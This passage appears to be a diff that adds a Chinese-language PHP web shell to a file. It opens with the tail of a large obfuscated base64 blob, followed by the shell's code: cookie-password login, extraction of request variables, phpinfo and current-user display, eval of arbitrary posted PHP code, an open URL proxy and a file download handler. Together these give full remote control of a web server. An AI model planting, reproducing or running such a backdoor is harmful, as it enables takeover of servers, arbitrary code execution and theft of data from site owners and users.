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')));
+if ($onoff != 1) {
+	@extract($_POST, EXTR_SKIP);
+	@extract($_GET, EXTR_SKIP);
+}
+
+$self = $_SERVER['PHP_SELF'];
+$dis_func = get_cfg_var("disable_functions");
+
+
+/*===================== 身份验证 =====================*/
+if($admin['check'] == "1") {
+	if ($_GET['action'] == "logout") {
+		setcookie ("adminpass", "");
+		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
+		echo "<span style=\"font-size: 12px; font-family: Verdana\">注销成功......<p><a href=\"".$self."\">三秒后自动退出或单击这里退出程序界面 &gt;&gt;&gt;</a></span>";
+		exit;
+	}
+
+	if ($_POST['do'] == 'login') {
+		$thepass=trim($_POST['adminpass']);
+		if ($admin['pass'] == $thepass) {
+			setcookie ("adminpass",$thepass,time()+(1*24*3600));
+			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
+			echo "<span style=\"font-size: 12px; font-family: Verdana\">登陆成功......<p><a href=\"".$self."\">三秒后自动跳转或单击这里进入程序界面 &gt;&gt;&gt;</a></span>";
+			exit;
+		}
+	}
+	if (isset($_COOKIE['adminpass'])) {
+		if ($_COOKIE['adminpass'] != $admin['pass']) {
+			loginpage();
+		}
+	} else {
+		loginpage();
+	}
+}
+/*===================== 验证结束 =====================*/
+
+// 判断 magic_quotes_gpc 状态
+if (get_magic_quotes_gpc()) {
+    $_GET = stripslashes_array($_GET);
+	$_POST = stripslashes_array($_POST);
+}
+
+// 查看PHPINFO
+if ($_GET['action'] == "phpinfo") {
+	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;";
+	exit;
+}
+if($_GET['action'] == "nowuser") {
+$user = get_current_user();
+if(!$user) $user = "报告长官，主机变态，无法获取当前进行用户名！";
+echo"当前进程用户名：$user";
+exit;
+}
+if(isset($_POST['phpcode'])){
+	eval("?".">$_POST[phpcode]<?");
+	exit;
+}
+// 在线代理
+if (isset($_POST['url'])) {
+	$proxycontents = @file_get_contents($_POST['url']);
+	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";
+	exit;
+}
+
+// 下载文件
+if (!empty($downfile)) {
+	if (!@file_exists($downfile)) {
+		echo "<script>alert('你要下的文件不存在!')</script>";
+	} else {
+		$filename = basename($downfile);
+		$filename_info = explode('.', $filename);
+		$fileext = $filename_info[count($filename_info)-1];
+		header('Content-type: application/x-'.$fileext);
